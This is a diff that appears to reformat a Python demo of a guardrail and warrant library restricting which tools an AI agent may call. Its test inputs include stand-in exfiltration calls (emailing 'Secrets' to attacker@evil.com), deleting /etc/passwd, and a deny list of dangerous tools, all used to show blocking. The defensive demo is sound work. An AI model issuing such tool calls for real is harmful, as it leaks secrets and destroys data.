@@ -19,6 +19,7 @@ import os
 # Check if openai-agents is installed
 try:
     from agents import Agent, Runner  # noqa: F401
+
     AGENTS_SDK_AVAILABLE = True
 except ImportError:
     AGENTS_SDK_AVAILABLE = False
@@ -41,6 +42,7 @@ from tenuo import SigningKey, Warrant
 # Demo 1: Tier 1 Guardrails (Runtime Constraints)
 # =============================================================================
 
+
 def demo_tier1_guardrails():
     """
     Tier 1: Simple constraint checking without cryptography.
@@ -56,10 +58,8 @@ def demo_tier1_guardrails():
     guardrail = create_tool_guardrail(
         # Only allow these tools
         allow_tools=["send_email", "read_file", "search"],
-
         # Deny these tools (takes precedence over allow)
         deny_tools=["delete_file", "execute_code"],
-
         # Per-tool argument constraints
         constraints={
             "send_email": {
@@ -74,7 +74,6 @@ def demo_tier1_guardrails():
                 "limit": Range(1, 100),  # Max 100 results
             },
         },
-
         # tripwire=True means halt agent on violation
         tripwire=True,
     )
@@ -87,34 +86,23 @@ def demo_tier1_guardrails():
     # Test the guardrail
     async def test_guardrail():
         # Valid tool call
-        valid_input = [{
-            "function": {
-                "name": "send_email",
-                "arguments": '{"to": "alice@company.com", "body": "Hello"}'
-            }
-        }]
+        valid_input = [
+            {"function": {"name": "send_email", "arguments": '{"to": "alice@company.com", "body": "Hello"}'}}
+        ]
         result = await guardrail(None, None, valid_input)
         print(f"Valid call result: {result.output_info}")
         print(f"  Tripwire triggered: {result.tripwire_triggered}")
 
         # Invalid tool call (constraint violation)
-        invalid_input = [{
-            "function": {
-                "name": "send_email",
-                "arguments": '{"to": "attacker@evil.com", "body": "Secrets"}'
-            }
-        }]
+        invalid_input = [
+            {"function": {"name": "send_email", "arguments": '{"to": "attacker@evil.com", "body": "Secrets"}'}}
+        ]
         result = await guardrail(None, None, invalid_input)
         print(f"\nInvalid call result: {result.output_info}")
         print(f"  Tripwire triggered: {result.tripwire_triggered}")
 
         # Denied tool
-        denied_input = [{
-            "function": {
-                "name": "delete_file",
-                "arguments": '{"path": "/etc/passwd"}'
-            }
-        }]
+        denied_input = [{"function": {"name": "delete_file", "arguments": '{"path": "/etc/passwd"}'}}]
         result = await guardrail(None, None, denied_input)
         print(f"\nDenied tool result: {result.output_info}")
         print(f"  Tripwire triggered: {result.tripwire_triggered}")
@@ -126,6 +114,7 @@ def demo_tier1_guardrails():
 # =============================================================================
 # Demo 2: Tier 2 Warrant-Based Authorization
 # =============================================================================
+
 
 def demo_tier2_warrant():
     """
@@ -149,16 +138,24 @@ def demo_tier2_warrant():
     print(f"Agent key: {agent_key.public_key.to_bytes().hex()[:16]}...")
 
     # Control plane issues warrant to agent
-    warrant = (Warrant.mint_builder()
-        .capability("send_email", {
-            "to": Pattern("*@company.com"),
-        })
-        .capability("read_file", {
-            "path": Pattern("/data/*"),
-        })
+    warrant = (
+        Warrant.mint_builder()
+        .capability(
+            "send_email",
+            {
+                "to": Pattern("*@company.com"),
+            },
+        )
+        .capability(
+            "read_file",
+            {
+                "path": Pattern("/data/*"),
+            },
+        )
         .holder(agent_key.public_key)  # Bind to agent
         .ttl(3600)  # Valid for 1 hour
-        .mint(control_key))
+        .mint(control_key)
+    )
 
     print(f"Warrant ID: {warrant.id}")
     print("Capabilities: send_email, read_file")
@@ -174,34 +171,33 @@ def demo_tier2_warrant():
     # Test the guardrail
     async def test_warrant_guardrail():
         # Valid: tool in warrant, constraints satisfied
-        valid_input = [{
-            "function": {
-                "name": "send_email",
-                "arguments": '{"to": "bob@company.com"}'
-            }
-        }]
+        valid_input = [{"function": {"name": "send_email", "arguments": '{"to": "bob@company.com"}'}}]
         result = await guardrail(None, None, valid_input)
         print(f"Valid call (in warrant): {result.output_info}")
         print(f"  Tripwire triggered: {result.tripwire_triggered}")
 
         # Invalid: tool NOT in warrant
-        invalid_input = [{
-            "function": {
-                "name": "delete_file",  # Not in warrant!
-                "arguments": '{"path": "/important/data"}'
+        invalid_input = [
+            {
+                "function": {
+                    "name": "delete_file",  # Not in warrant!
+                    "arguments": '{"path": "/important/data"}',
+                }
             }
-        }]
+        ]
         result = await guardrail(None, None, invalid_input)
         print(f"\nUnauthorized tool: {result.output_info[:80]}...")
         print(f"  Tripwire triggered: {result.tripwire_triggered}")
 
         # Invalid: constraint violation
-        constraint_input = [{
-            "function": {
-                "name": "send_email",
-                "arguments": '{"to": "attacker@external.com"}'  # Violates constraint
+        constraint_input = [
+            {
+                "function": {
+                    "name": "send_email",
+                    "arguments": '{"to": "attacker@external.com"}',  # Violates constraint
+                }
             }
-        }]
+        ]
         result = await guardrail(None, None, constraint_input)
         print(f"\nConstraint violation: {result.output_info[:80]}...")
         print(f"  Tripwire triggered: {result.tripwire_triggered}")
@@ -213,6 +209,7 @@ def demo_tier2_warrant():
 # =============================================================================
 # Demo 3: Integration with OpenAI Agents SDK
 # =============================================================================
+
 
 def demo_agents_sdk_integration():
     """
@@ -257,11 +254,9 @@ def demo_agents_sdk_integration():
 
     # Run the agent (requires OPENAI_API_KEY)
     if os.environ.get("OPENAI_API_KEY"):
+
         async def run_agent():
-            result = await Runner.run(
-                agent,
-                "Send an email to alice@company.com saying hello"
-            )
+            result = await Runner.run(agent, "Send an email to alice@company.com saying hello")
             print(f"Agent output: {result.final_output}")
 
         asyncio.run(run_agent())
@@ -273,6 +268,7 @@ def demo_agents_sdk_integration():
 # =============================================================================
 # Demo 4: GuardrailResult API
 # =============================================================================
+
 
 def demo_guardrail_result():
     """
@@ -309,6 +305,7 @@ def demo_guardrail_result():
 # =============================================================================
 # Main
 # =============================================================================
+
 
 def main():
     print()
@@ -354,4 +351,3 @@ For more information:
 
 if __name__ == "__main__":
     main()
-
